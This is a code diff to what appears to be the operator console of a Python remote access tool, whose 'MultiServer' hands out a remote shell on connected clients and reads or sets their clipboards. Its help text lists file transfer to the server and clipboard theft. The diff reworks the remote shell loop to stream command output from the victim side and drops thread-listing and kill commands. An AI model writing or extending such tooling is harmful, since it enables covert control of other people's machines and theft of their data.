@@ -1,7 +1,6 @@
 import logging
 import os
 import pickle
-import signal
 import socket
 import sys
 import threading
@@ -26,8 +25,6 @@ interface_help = """
 --r (file) | Transfers file to Server
 --c (Text) | Copies to Client Clipboard
 --p | Returns Client Current Clipboard
---t | See running Threads
---k (PID) | Kill running Thread
 --b | Run Connection in Background"""
 
 turtle_help = """
@@ -297,27 +294,25 @@ class MultiServer(object):
                 break
             if command[:2].lower() == 'cd':
                 self.send(conn, command.encode())
-                cwd = self.receive(conn).decode() + ">"
+                cwd = self.receive(conn, _print=False).decode()
                 continue
             self.send(conn, command.encode())
-            self.receive(conn)
+            while 1:
+                output = self.receive(conn, _print=False)
+                if output == b'<DONE>':
+                    break
+                try:
+                    print(output.decode())
+                except UnicodeDecodeError:
+                    print(output)
+                self.send(conn, b'<READY>')
+
 
     def interface(self, conn, target):
         while True:
             command = input('>> ')
             if '--b' in command:
                 break
-            if '--t' in command:
-                self.send(conn, b'<THREADS>')
-                self.receive(conn)
-                continue
-            if command[:3] == '--k':
-                if not len(command) > 4:
-                    print('Missing Argument')
-                    continue
-                self.send(conn, '<KILL> {}'.format(command[4:].strip()).encode())
-                self.receive(conn).decode()
-                continue
             if '--e' in command:
                 self.shell(conn)
                 continue
@@ -348,6 +343,7 @@ class MultiServer(object):
                 print(interface_help)
 
     def turtle(self):
+        print("Type '--h' for help")
         while True:
             command = input('> ')
             if command == '--h':
@@ -362,7 +358,6 @@ class MultiServer(object):
 def create_workers():
     """ Create worker threads (will die when main exits) """
     server = MultiServer()
-    #server.register_signal_handler()
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=work, args=(server,))
         t.daemon = True
